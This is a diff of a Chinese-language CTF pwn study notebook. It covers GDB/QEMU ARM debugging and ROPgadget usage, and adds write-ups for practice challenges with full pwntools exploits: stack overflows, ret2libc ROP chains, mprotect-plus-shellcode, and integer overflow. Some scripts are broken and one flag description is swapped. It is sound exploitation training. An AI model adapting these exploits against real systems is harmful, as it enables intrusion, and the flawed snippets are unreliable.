@@ -1,9 +1,172 @@
-# PwnStudy
+
+
+
+
+# GDB调试
+
+## 查看got表
+
+在run之后输入got查看got表
+
+## 查看寄存器
+
+使用tel xxxx查看地址的内容；
+
+或者使用tel $rip查看寄存器中的数据；
+
+# IOT
+
+## 资料网站
+
+https://www.cnblogs.com/H4lo/articles/11721932.html
+
+## arm环境配置
+
+gdb-arm:
+
+```python
+apt-get install qemu-user
+apt-get install gdb-multiarch
+apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu
+交叉编译⼯具
+apt install gcc-arm-linux-gnueabi
+apt install libc6-arm64-cross
+```
+
+https://www.qemu.org/
+
+https://blog.csdn.net/leumber/article/details/81078171
+
+https://blog.csdn.net/tianyexing2008/article/details/111009427
+
+运行方法：
+
+```python
+qume-arm -L /usr/arm-linux-gnueabi ./pwn #运⾏程序
+--------------------------------------------------------------------
+qume-arm -L /usr/arm-linux-gnueabi -g 8888 ./pwn #以888端⼝运⾏程序
+--------------------------------------------------------------------
+#链上端⼝来调试
+gdb-multiarch
+file ./pwn
+target remote localhost:8888
+---------------------------------------------------------------------
+#设断点到调试地址，之后就可以正常调试
+---------------------------------------------------------------------
+#如果程序去除符号表，则要加载程序位置
+ps -a #查看qemu端⼝
+cat /proc/端⼝/maps #找到程序地址
+---------------------------------------------------------------------
+#在调试窗⼝ 但我⽬前并没有成功过qwq
+add-symbol-file ./pwn 地址
+b *地址
+```
+
+## arm汇编基础
+
+https://www.anquanke.com/post/id/86383
+
+## arm汇编常用指令
+
+⼩⼯具： https://www.jb51.net/softs/10029.html#downintro2 arm常⽤寄存器： https://zhuanlan.zhihu.com/p/634696567
+
+## 例题
+
+ret2text_arm：
+
+![image-20231103010758782](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010758782.png)
+
+exp：
+
+```python
+from pwn import *
+context(log_level='debug',arch='arm')
+pwn='./ret2text_arm'
+p=process(["qemu-arm","-L","/usr/arm-linux-gnueabi",pwn])
+backdoor=0x0001045C
+payload=b'a'*0xc+p32(backdoor)
+p.sendlineafter("input:\n",payload)
+p.interactive()
+```
+
+2022安洵杯babyarm
+
+![image-20231103010918161](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010918161.png)
+
+⾸先⽤ida分析⼀下，需要先绕过⼀个base64的判断，然后到溢出点，溢出量是0x2c.
+
+![image-20231103010939032](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010939032.png)
+
+查看⼀下可⽤的gadget，再到ida⾥看
+
+![image-20231103010959340](C:\Users\22522\AppData\Roaming\Typora\typora-user-images\image-20231103010959340.png)
+
+这⾥是我们可以利⽤的gadget，⼈⻤师傅说反复利⽤csu，但是我实现不了，求教
+
+exp:
+
+```python
+from pwn import *
+p = process(["qemu-arm","-g", "4444","-L", "/usr/arm-linux-gnueabi/", "./c
+hall"])
+context.log_level='debug'
+context.arch='arm'
+elf = ELF('./chall')
+libc = ELF('libc-2.27.so')
+s = lambda data :p.send(str(data))
+sa = lambda delim,data :p.sendafter(str(delim), str(data))
+sl = lambda data :p.sendline(str(data))
+sla = lambda delim,data :p.sendlineafter(str(delim), str(data)
+)
+r = lambda num :p.recv(num)
+ru = lambda delims, drop=True :p.recvuntil(delims, drop)
+itr = lambda :p.interactive()
+uu32 = lambda data :u32(data.ljust(4,b'\x00'))
+uu64 = lambda data :u64(data.ljust(8,b'\x00'))
+leak = lambda name,addr :log.success('{} = {:#x}'.format(name,
+addr))
+sla('msg> ','s1mpl3Dec0d4r')
+movcall = 0x00010ca0
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+payload = b'a'*0x2c+p32(r4)+p32(0)+p32(0)+p32(0)
+payload +=p32(puts_got)+p32(0)+p32(0)+p32(0)
+payload +=+p32(r3)+p32(puts_plt)+p32(movcall)+p32(0)+p32(0)+p32(0)+p32(0)+
+p32(0)+p32(0)+p32(0)+p32(0x0010B60)
+p.sendlineafter('comment> ',payload)
+libcbase = uu64(r(4)) - libc.sym['puts']
+system = libcbase + libc.sym['system']
+binsh = libcbase + 0x00137db0 #0x00131bec
+leak('libcbase',libcbase)
+sla('msg> ','s1mpl3Dec0d4r')
+payload = b'a'*0x2c+p32(r4)+p32(0)+p32(0)+p32(0)
+payload +=+p32(binsh)+p32(0)+p32(0)+p32(0)+p32(r3)+p32(system)+p32(movcall
+)
+p.sendlineafter('comment> ',payload)
+p.interactive()
+```
+
+
+
 # 小命令
 
 ```python
 ROPgadget --binary xxx --string '/bin/sh'#查找字符串
 ROPgadget --binary xxx --only 'pop|ret' | grep 'rdi'#查找控制寄存器的指令
+```
+
+## 找POP指令
+
+```python
+ ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep pop
+```
+
+
+
+## 寻找ret指令
+
+```python
+ROPgadget --binary xxx  --only 'ret'
 ```
 
 ## 找binsh字符串的地址
@@ -12,11 +175,66 @@ ROPgadget --binary xxx --only 'pop|ret' | grep 'rdi'#查找控制寄存器的指
 binsh_addr = next(elf.search(b"/bin/sh"))
 ```
 
-# 函数
+## 查看题目链接的libc版本
+
+```python
+ldd -v xxxx
+```
+
+## 确定patch什么库
+
+```python
+strings libc.xxxxx |grep Ubuntu
+```
+
+## 正式patch
+
+```python
+patchelf --set-interpreter /home/tangjunyi/桌面/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/ld-linux-x86-64.so.2 ./xxxx
+```
+
+```python
+patchelf --add-needed /home/tangjunyi/桌面/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6 ./silent
+```
+
+## tmux分屏命令
+
+```python
+tmux new -s test#创建一个新会话
+tmux kill-session -t test#删除一个会话
+ctrl+p/n #切换会话
+tmux set mouse on#设置鼠标支持，可以在窗口进行滚动
+```
+
+# 函数与寄存器
 
 ```python
 write(1,buf,8)#分别为标准输出，输出的地址，输出的长度（字节）--------rdi rsi rdx
 ```
+
+```python
+int mprotect(const void *start, size_t len, int prot);#第一个参数填的是一个地址，是指需要进行操作的地址。
+
+　　#第二个参数是地址往后多大的长度。
+
+　　#第三个参数的是要赋予的权限。
+
+　　#mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
+```
+
+prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
+
+　　1）PROT_READ：表示内存段内的内容可写；
+
+　　2）PROT_WRITE：表示内存段内的内容可读；
+
+　　3）PROT_EXEC：表示内存段中的内容可执行；
+
+　　4）PROT_NONE：表示内存段中的内容根本没法访问。
+
+***prot=7 是可读可写可执行**  **#这个是个知识点。。。我是没找到出处，我唯一能想到的就是师傅在调试的过程发现第三个参数等于7是赋给的内存地址权限是可读可写可执行叭。***
+
+需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。
 
 # 汇编基础
 
@@ -29,7 +247,7 @@ write(1,buf,8)#分别为标准输出，输出的地址，输出的长度（字�
 .text:0000000000001213 48 89 E5                      mov     rbp, rsp
 .text:0000000000001216 48 83 EC 10                   sub     rsp, 10h
 .text:000000000000121A C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0
-.text:0000000000001221 83 7D FC 01                   cmp     [rbp+var_4], 1#作比较
+.text:0000000000001221 83 7D FC 01                   cmp     [rbp+var_4], 1#不为零则跳转（即不相同就跳转）
 .text:0000000000001225 75 11                         jnz     short loc_1238#如果上一次比较不相等就跳转
 .text:0000000000001225
 .text:0000000000001227 48 8D 3D DA 0D 00 00          lea     rdi, command                    ; "/bin/sh"
@@ -38,7 +256,11 @@ write(1,buf,8)#分别为标准输出，输出的地址，输出的长度（字�
 .text:0000000000001233
 ```
 
+==mov eax,1【eax为目的操作数，1为源操作数】---目的操作数的内容会发生改变，而源操作数不会改变==
 
+==cmp指令：通过让目的操作数减去源操作数来判断他俩是否相等，结果为0则不跳转继续执行下一个指令；如果结果不为0，就说明他俩不相等，此时在jnz进行跳转==
+
+==jnz指令：如果上一次比较不相等就发生跳转==
 
 # 极客大挑战2023--PWN
 
@@ -506,7 +728,124 @@ int func()
 
 # BUUPWN刷题
 
-## 泄露canary
+## 向指定内存赋可执行权限
+
+### get_started_3dsctf_2016
+
+```python
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[56]; // [esp+4h] [ebp-38h] BYREF
+
+  printf("Qual a palavrinha magica? ", v4[0]);
+  gets(v4);
+  return 0;
+}
+```
+
+```python
+void __cdecl get_flag(int a1, int a2)
+{
+  int v2; // esi
+  unsigned __int8 v3; // al
+  int v4; // ecx
+  unsigned __int8 v5; // al
+
+  if ( a1 == 814536271 && a2 == 425138641 )
+  {
+    v2 = fopen("flag.txt", "rt");
+    v3 = getc(v2);
+    if ( v3 != 255 )
+    {
+      v4 = (char)v3;
+      do
+      {
+        putchar(v4);
+        v5 = getc(v2);
+        v4 = (char)v5;
+      }
+      while ( v5 != 255 );
+    }
+    fclose(v2);
+  }
+}
+```
+
+如上图，能发现在main函数中溢出到任意地址
+
+```python
+unsigned int __cdecl mprotect(int a1, int a2, int a3)
+{
+  unsigned int result; // eax
+
+  result = dl_sysinfo(a2, a3);
+  if ( result >= 0xFFFFF001 )
+    return _syscall_error();
+  return result;
+}
+```
+
+在0x0806ec80发现了一个mprotect函数，可以在上面的笔记查看他的作用，之后vmmap，查看内存权限：
+
+```python
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+     Start        End Perm     Size Offset File
+ 0x8048000  0x80ea000 r-xp    a2000      0 /home/tangjunyi/pwn/xie
+ 0x80ea000  0x80ec000 rw-p     2000  a1000 /home/tangjunyi/pwn/xie#从这里开始修改为可执行权限,然后在这里写shellcode
+ 0x80ec000  0x810f000 rw-p    23000      0 [heap]
+0xf7ff8000 0xf7ffc000 r--p     4000      0 [vvar]
+0xf7ffc000 0xf7ffe000 r-xp     2000      0 [vdso]
+0xfffdd000 0xffffe000 rw-p    21000      0 [stack]
+```
+
+虽然这道题开启了栈不可执行，但我们可以修改栈上的权限为可执行。可以使用mprotect进行修改（mprotect函数作用看上面的笔记）
+
+找到开始修改的地址，即上图中的0x80ea000作为开始修改的地址
+
+==需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。==即不能是0x80ebf80
+
+长度可以设置为0x1000，反正大一点也没有坏处
+
+执行权限就设置为7，也就是最高权限可读写可执行
+
+传参的话就用==0x0804f460 : pop ebx ; pop esi ; pop ebp ; ret==这一串即可，不用纠结用啥寄存器，能pop三个就行
+
+当我们修改完权限后，就可以在指定内存读入shellcode了
+
+开始构造payload：
+
+```python
+from pwn import *
+#p = process('./xie')
+#gdb.attach(p) #open gdb
+context(os="linux",arch="i386",log_level='debug')
+elf = ELF('./xie')
+p = remote('node4.buuoj.cn',28097)
+pop_ebx_esi_ebp_ret = 0x0804f460 #往函数里弹参数
+
+mp1 = 0x80ea000 #这里是我们刚刚找到准备修改权限的起始地址，同时作为mprotect的参数和read的参数
+mp2 = 0x1000 #修改的长度为0x1000
+mp3 = 0x7 #修改权限等级为7
+mprotect_addr = elf.symbols['mprotect'] #找到mprotect函数的地址
+read_addr = elf.symbols['read'] #找到read函数的地址
+
+payload = b'a'*0x38 + p32(mprotect_addr) + p32(pop_ebx_esi_ebp_ret) + p32(mp1) + p32(mp2) + p32(mp3)
+#溢出后返回到mprotect函数，然后往寄存器中弹参数（实则是往栈中弹参数，然后再通过栈传参，不用管是什么寄存器），分别是mprotect的第一个参数：修改权限的起始地址0x80ea000；第二个参数：修改的长度0x1000；第三个参数：修改的权限等级7
+payload += p32(read_addr) + p32(pop_ebx_esi_ebp_ret) + p32(0) + p32(mp1) + p32(0x100)#ret到read函数地址，也向read函数传参；第一个参数：fd=0标准输入；第二个参数：写入数据的地址0x80ea000（因为刚刚已经对这块地址赋予了可读可写可执行权限，；第三个参数：写入的数据最大长度0x100
+payload += p32(mp1)#读入shellcode后，跳到已修改地址的起始位置开始执行shellcode
+
+p.sendline(payload)#发送第一段payload，进行修改权限操作和调用read函数操作，为第二段payload提供了写入shellcode的地方
+payload1 = asm(shellcraft.sh())#第二段payload生成一串shellcode
+p.send(payload1)#写入shellcode
+p.interactive()
+```
+
+
+
+## 技巧类
+
+### 泄露canary
 
 ```python
 from pwn import *
@@ -531,11 +870,33 @@ p.sendline(payload1)
 p.interactive()
 ```
 
+泄露canary的主要思路就是将栈空间覆盖，同时覆盖canary的最低一个字节00，然后去接收返回的数据（前提是由printf或puts函数将变量中的数据输出，例如我们要泄露的是buf中的canary（事实上一旦开启canary，所有变量都会被加上canary），那么伪代码中一定要有puts(buf)之类的输出函数来输出canary的地址。
 
+第二步就是将获取到的canary添加到payload中，因为函数在返回的时候会检测canary的值，如果不相同就会崩溃。所以我们应该构造出形如------b'a'*xxx + p64(canary) + b'a'*8 + p64(retaddr)-----的payload。
+
+==注：canary在rbp的下方（一般都是紧挨着rbp，但出题人可能会改变其位置）结构一般如下：==
+
+-----------------------------------------------
+
+retaddr（这是高地址）
+
+---------------------------------
+
+rbp
+
+-----------------------------------
+
+canary
+
+-------------------------------------------------------
+
+buf（低地址）
+
+-----------------------------------------
 
 题目来源：DASCTF（GuestBook）
 
-## 泄露栈地址
+### 泄露栈地址
 
 ```python
 from pwn import *
@@ -555,7 +916,344 @@ payload = shellcode.ljust(0x78,b'\x00') + p64(addr)#先向v1写入shellcode，0x
 p.sendafter(b'strong',payload)
 ```
 
+==思路就是泄露当前函数的rbp（有时候泄露的是上一个函数的rbp，上述代码就是），再算出rbp到变量的距离，从而找到变量的入口。==
+
+==一般用于写入了shellcode但不知道当前变量的入口在哪里，此时就需要泄露栈地址了==
+
+==上一个函数rbp的地址，作为数据被压入栈中，当前函数的rbp寄存器指向它==
+
+### jarvisoj_level2
+
+太简单了，附上exp：
+
+```python
+
+from pwn import*
+
+p=remote('node3.buuoj.cn',17589)
+shell_addr=0x804a024
+system=0x8048320
+
+payload=b'a'*(0x88+4)+p32(system)+p32(8)+p32(shell_addr)
+
+p.sendline(payload)
+p.interactive()
+```
+
+### ciscn_2019_n_8
+
+题目：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-14h] [ebp-20h]
+  int v5; // [esp-10h] [ebp-1Ch]
+
+  var[13] = 0;
+  var[14] = 0;
+  init();
+  puts("What's your name?");
+  __isoc99_scanf("%s", var, v4, v5);
+  if ( *(_QWORD *)&var[13] )
+  {
+    if ( *(_QWORD *)&var[13] == 17LL )
+      system("/bin/sh");
+    else
+      printf(
+        "something wrong! val is %d",
+        var[0],
+        var[1],
+        var[2],
+        var[3],
+        var[4],
+        var[5],
+        var[6],
+        var[7],
+        var[8],
+        var[9],
+        var[10],
+        var[11],
+        var[12],
+        var[13],
+        var[14]);
+  }
+  else
+  {
+    printf("%s, Welcome!\n", var);
+    puts("Try do something~");
+  }
+  return 0;
+}
+```
+
+- 定义一个名为`main`的函数，它接受三个参数：`argc`表示命令行参数的个数，`argv`表示命令行参数的数组，`envp`表示环境变量的数组。
+
+- 定义两个整型变量`v4`和`v5`，它们在栈上分配空间，并用注释标明它们的地址偏移量。
+
+- 定义一个长度为15的整型数组`var`，并将它的第14个和第15个元素初始化为0。
+
+- 调用一个名为`init`的函数，它可能是用来做一些初始化操作的。
+
+- 调用`puts`函数，向标准输出打印一句话：“What’s your name?”，并换行。
+
+- 调用`__isoc99_scanf`函数，从标准输入读取一个字符串，并将其存储在数组`var`中。同时，将变量`v4`和`v5`作为额外的参数传递给该函数，这可能是一个漏洞，因为这两个变量没有被初始化，而且没有被使用。
+
+- 判断数组`var`中第14个和第15个元素组成的64位整数是否为0。如果不为0，则继续判断该整数是否等于17。如果等于17，则调用`system`函数，执行一个名为"/bin/sh"的程序，这可能是一个后门，因为它可以让用户获得一个shell。如果不等于17，则调用`printf`函数，向标准输出打印一句话：“something wrong! val is %d”，并将数组`var`中的所有元素作为参数传递给该函数。
+
+- 如果数组`var`中第14个和第15个元素组成的64位整数为0，则调用`printf`函数，向标准输出打印一句话：“%s, Welcome!\n”，并将数组中存储的字符串作为参数传递给该函数。然后调用`puts`函数，向标准输出打印一句话：“Try do something~”，并换行。
+
+- 最后返回0，表示程序正常结束。
+
+  exp如下：
+
+```python
+from pwn import *
+p = process('./ciscn_2019_n_8')
+#p= remote('pwn.node.game.sycsec.com',30345)
+#gdb.attach(p)
+elf = ELF('./ciscn_2019_n_8')
+context(os="linux",arch="amd64",log_level='debug')
+
+payload = p32(17)*14 
+p.sendline(payload)
+p.interactive()
+```
+
+由伪代码可以看出我们输入的数据会被赋值给var数组，成为var数组中的元素
+
+==因为题目说要让var[13]等于17，也就是让var数组中第14个元素等于17即可，那么我们往数组中填充14个17就可以成功调用system==
+
+==上面的数组中var[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14]，可以看出var[13]其实是第14个元素，故填充14个17就可以覆盖掉第14个元素==
+
+## ret2libc类
+
+### ciscn_2019_c_1
+
+main函数
+
+```python
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-4h] BYREF
+
+  init(argc, argv, envp);#清空缓冲区
+  puts("EEEEEEE                            hh      iii                ");
+  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
+  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
+  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
+  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
+  puts("====================================================================");
+  puts("Welcome to this Encryption machine\n");
+  begin();#自定义函数-----------
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      fflush(0LL);
+      v4 = 0;
+      __isoc99_scanf("%d", &v4);#第一次输入
+      getchar();#输入函数
+      if ( v4 != 2 )
+        break;
+      puts("I think you can do it by yourself");
+      begin();
+    }
+    if ( v4 == 3 )
+    {
+      puts("Bye!");
+      return 0;
+    }
+    if ( v4 != 1 )
+      break;
+    encrypt();#自定义函数--------------重点
+    begin();
+  }
+  puts("Something Wrong!");
+  return 0;
+}
+```
+
+分析上面的伪代码，可以发现while中的代码是防止我们输入其他的数字，如果在scanf输入了1，2,3以外的数字，程序就会报错。如果是123其中之一，则会进入encrypt函数
+
+begin()函数：
+
+```python
+int begin()
+{
+  puts("====================================================================");
+  puts("1.Encrypt");
+  puts("2.Decrypt");
+  puts("3.Exit");
+  return puts("Input your choice!");
+}
+```
 
 
-当前rbp(0x12345)---------------------->栈中数据(0xaababb)；==上一个函数rbp的地址，作为数据被压入栈中，当前函数的rbp寄存器指向它==
+
+encrypt()函数：
+
+```python
+int encrypt()
+{
+  size_t v0; // rbx
+  char s[48]; // [rsp+0h] [rbp-50h] BYREF
+  __int16 v3; // [rsp+30h] [rbp-20h]
+
+  memset(s, 0, sizeof(s));
+  v3 = 0;
+  puts("Input your Plaintext to be encrypted");
+  gets(s);
+  while ( 1 )
+  {
+    v0 = (unsigned int)x;
+    if ( v0 >= strlen(s) )
+      break;
+    if ( s[x] <= 96 || s[x] > 122 )
+    {
+      if ( s[x] <= 64 || s[x] > 90 )
+      {
+        if ( s[x] > 47 && s[x] <= 57 )
+          s[x] ^= 0xFu;
+      }
+      else
+      {
+        s[x] ^= 0xEu;
+      }
+    }
+    else
+    {
+      s[x] ^= 0xDu;
+    }
+    ++x;
+  }
+  puts("Ciphertext");
+  return puts(s);
+}
+```
+
+while中有一段加密算法，应该是异或之类的，但实际上我们不需要去解密。这里的gets是我们第二次的输入点，绕过strlen函数，就不用去管这个加密算法了，但由于没有system函数所以判断是ret2libc
+
+==运行时：==
+
+```python
+┌──(root㉿tangjunyi)-[/home/tangjunyi/pwn]
+└─# ./ciscn_2019_c_1                                 
+EEEEEEE                            hh      iii                
+EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  
+EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e 
+EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  
+EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee 
+====================================================================
+Welcome to this Encryption machine
+
+====================================================================
+1.Encrypt
+2.Decrypt
+3.Exit
+Input your choice!
+1#第一次输入
+Input your Plaintext to be encrypted
+1111#第二次输入
+Ciphertext
+>>>>
+====================================================================#第二次循环
+1.Encrypt
+2.Decrypt
+3.Exit
+Input your choice!
+```
+
+综上所述程序一共提供了两次输入机会，第一次只能输入1 2 3，但第二次输入可以发生栈溢出（因为第二次输入发生在encrypt函数中，而在这个函数中我们发现了gets函数）
+
+exp如下：
+
+```python
+from pwn import*
+
+p=remote('node4.buuoj.cn',25635)
+elf=ELF('./ciscn_2019_c_1')
+
+main = 0x400b28#main函数的入口，为了进行第二次溢出
+pop_rdi_ret = 0x400c83
+ret = 0x4006b9#使用ROPgadget找到一个ret指令平衡栈
+
+puts_plt=elf.plt['puts']
+puts_got=elf.got['puts']
+
+p.sendlineafter(b'choice!\n','1')
+payload=b'\x00'+b'a'*87 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+
+p.sendlineafter(b'encrypted\n',payload)#第一次溢出，获取puts的真实地址
+p.recvline()#接收到【Ciphertext >>>>】后换行继续接收
+p.recvline()#接收到【1.Encrypt 2.Decrypt3.Exit】后换行，此时进行到了【Input your choice!】
+
+puts_addr=u64(p.recvuntil(b'\n')[:-1].ljust(8,b'\0'))#接收puts真实地址
+print("puts_addr ="+hex(puts_addr)) #获取了puts的真实地址后，在libcdatabase中输入puts低三位找到libc版本，进而找到其他函数的偏移量
+libc_base = puts_addr - 0x0809c0#算出基地址
+binsh_addr = libc_base + 0x1b3e9a
+system_addr = libc_base + 0x04f440
+p.sendlineafter(b'choice!\n','1')
+
+payload=b'\x00'+ b'a'*87 + p64(ret) + p64(pop_rdi_ret)  + p64(binsh_addr) + p64(system_addr)
+
+p.sendlineafter('encrypted\n',payload)#第二次溢出：栈溢出的输入点是在【Input your Plaintext to be encrypted】之后
+
+p.interactive()
+
+```
+
+## 整形溢出
+
+### bjdctf_2020_babystack
+
+ida查看main函数：
+
+```python
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
+  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  LODWORD(nbytes) = 0;
+  puts("**********************************");
+  puts("*     Welcome to the BJDCTF!     *");
+  puts("* And Welcome to the bin world!  *");
+  puts("*  Let's try to pwn the world!   *");
+  puts("* Please told me u answer loudly!*");
+  puts("[+]Are u ready?");
+  puts("[+]Please input the length of your name:");
+  __isoc99_scanf("%d", &nbytes);#这个输入规定了我们下次read读入的长度，所以要进行整数溢出，让他变得很大，方便下面的read进行溢出
+  puts("[+]What's u name?");
+  read(0, buf, (unsigned int)nbytes);#nbytes是无符号类型，如果输入一个负数，会让它变得很大
+  return 0;
+}
+```
+
+
+
+```python
+from pwn import *
+from LibcSearcher import *
+p = process('./sw')
+#gdb.attach(p) #open gdb
+context(os="linux",arch="amd64",log_level='debug')
+elf = ELF('./sw')
+#p = remote('node6.anna.nssctf.cn',28969)
+
+backdoor = 0x4006ea
+payload = b'a'*24 + p64(backdoor)
+p.sendlineafter(b'your name:','-1')#对于无符号数nbytes，负数会让他变得很大
+p.recv()
+
+p.send(payload)
+p.interactive()
+
+```
+
+
+
+
 
